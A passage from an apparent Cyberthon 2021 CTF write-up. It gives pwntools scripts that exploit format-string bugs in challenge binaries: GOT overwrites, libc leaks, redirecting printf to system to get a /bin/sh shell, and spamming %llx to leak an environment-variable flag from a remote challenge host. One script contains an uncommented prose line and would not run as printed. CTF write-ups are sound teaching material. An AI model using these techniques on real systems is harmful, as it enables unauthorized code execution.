<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">binary</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">ELF(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">./apcdb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">context.arch</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">amd64</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">inp_offset</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">6</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">payload</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">fmtstr_payload(inp_offset, {binary.got[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">exit</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">40083f</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">})</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(payload)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">Lookup: </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">Lookup: </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">%7$s</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">4</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.got[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">printf</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">])) </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Align it properly or you die!</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Don&#39;t be like me in stacktheflags!</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">for </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># print(r.recvuntil(&quot;...&quot;)[:-10].ljust(8,b&#39;\x00&#39;))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">printf</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">u64(r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)[:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">].ljust(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\x00</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">hex</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(printf))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">Lookup: </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">%7$s</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">4</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.got[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">__libc_start_main</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]))</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Align it properly or you die!</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Don&#39;t be like me in stacktheflags!</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">for </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_start</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">u64(r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)[:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">].ljust(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\x00</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">hex</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(libc_start))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_start</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">21b10</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">system</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">4f550</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">str_bin_sh</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1b3e1a</span><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"> # Bad shell. BAD SHELL &gt;:(</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">payload</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">fmtstr_payload(inp_offset, {binary.got[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">printf</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]:system})</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(payload)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">/bin/sh</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\x00</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.interactive()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><p><img src="/assets/Images/Cyberthon-2021/apcdb_flag.png" alt=""></p><h3 id="flag-3" tabindex="-1">Flag! <a class="header-anchor" href="#flag-3" aria-label="Permalink to â€œFlag!â€">â€‹</a></h3><p><code>Cyberthon{f4k3_c0nt4ct5_f41lur3}</code></p><h2 id="placeholder" tabindex="-1">Placeholder <a class="header-anchor" href="#placeholder" aria-label="Permalink to â€œPlaceholderâ€">â€‹</a></h2><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span>Hohoho seems like one of the APOCALYPSE agents messed up big time. </span></span>
<span class="line"><span>Seems this agent went to deploy his/her code for testing and completely forgot to bring down the network service. </span></span>
<span class="line"><span>This careless agent even forgot to private the repository containing the test code, </span></span>
<span class="line"><span>so we&#39;ve managed to obtain the source for the entire project, dockerfile and all. </span></span>
<span class="line"><span>We&#39;ve provided you with everything that we&#39;ve found, so can you get the flag from their server?</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>(Scared off by Dockerfile until <code>niktay</code> said &quot;guys easiest pwn chall&quot;)</p><h3 id="reconnaissance-4" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-4" aria-label="Permalink to â€œReconnaissanceâ€">â€‹</a></h3><p>We are greeted with the binary that does... nothing??? <img src="/assets/Images/Cyberthon-2021/placeholder_main.png" alt=""></p><p>N-no seriously, it just takes in our input and does nothing! Not even a GOT overwrite! <img src="/assets/Images/Cyberthon-2021/placeholder_checksec.png" alt=""></p><p>However, this Dockerfile changed everything for me... <img src="/assets/Images/Cyberthon-2021/placeholder_env.png" alt=""></p><h3 id="vulnerability-analysis-2" tabindex="-1">Vulnerability Analysis <a class="header-anchor" href="#vulnerability-analysis-2" aria-label="Permalink to â€œVulnerability Analysisâ€">â€‹</a></h3><p>We have, basically:</p><ol><li>A <strong>Format String Exploit</strong></li><li>...nothing else.</li></ol><p>However, we know that <strong>environment variables</strong> are stored on the stack, which means our <code>flag</code> is <strong>ALSO</strong> on the stack!</p><p>Verdict: <strong>Stack Smashing</strong> (this is a 10pt picoCTF challenge, my god)</p><h3 id="the-exploit-3" tabindex="-1">The Exploit <a class="header-anchor" href="#the-exploit-3" aria-label="Permalink to â€œThe Exploitâ€">â€‹</a></h3><p>So I said we gonna smash the stack.</p><p>&quot;But when?&quot;. you ask.</p><p><strong>WE SMASH IT NOW</strong>.</p><p>This honestly needs no more explanation. We literally spam <code>%p</code> until the flag appears.</p><p>In order to preserve the sanity of my terminals I opted to save <code>stdout</code> into a file.</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> binascii </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> unhexlify,hexlify</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> re</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> sys</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Smash the stack very hard using this. Sorry niktay.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">sys.stdout</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">log.txt</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">w</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">process(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">./placeholder</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">streeng</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">i</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">100</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">while</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> hexlify(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">Cybe</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">[::</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]).decode() </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">not</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> in</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> streeng:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    r</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">30501</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    r.sendline(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">%llx</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">i)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    streeng</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvall().decode()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    streeng</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">re.sub(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">r</span><span style="--shiki-light:#032F62;--shiki-dark:#FF5555;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#F8F8F2;--shiki-dark-font-style:italic;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">0x</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#F8F8F2;--shiki-dark-font-style:italic;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">|</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#FF79C6;--shiki-dark-font-weight:inherit;">\(</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">nil</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#FF79C6;--shiki-dark-font-weight:inherit;">\)</span><span style="--shiki-light:#032F62;--shiki-dark:#FF5555;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;"> &#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,streeng)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    streeng</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">re.split(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">r</span><span style="--shiki-light:#032F62;--shiki-dark:#FF5555;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#F8F8F2;--shiki-dark-font-style:italic;">(</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#F8F8F2;--shiki-dark-font-style:italic;"> )</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#032F62;--shiki-dark:#FF5555;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,streeng)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    log.info(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">i</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> {</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">streeng</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    i</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> i</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">500</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">        break</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(streeng)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.interactive()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>Where we notice something... interesting...</p><p><img src="/assets/Images/Cyberthon-2021/placeholder_offset.png" alt=""></p><p>Considering the number of 6 and 7s in the hex string, I think it is safe to assume that <code>THIS IS THE FLAG</code> ðŸ˜„</p><p>Let&#39;s check it out, remembering that the stack is <code>little endian</code>...</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> binascii </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> unhexlify,hexlify</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> re</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> sys</span></span>
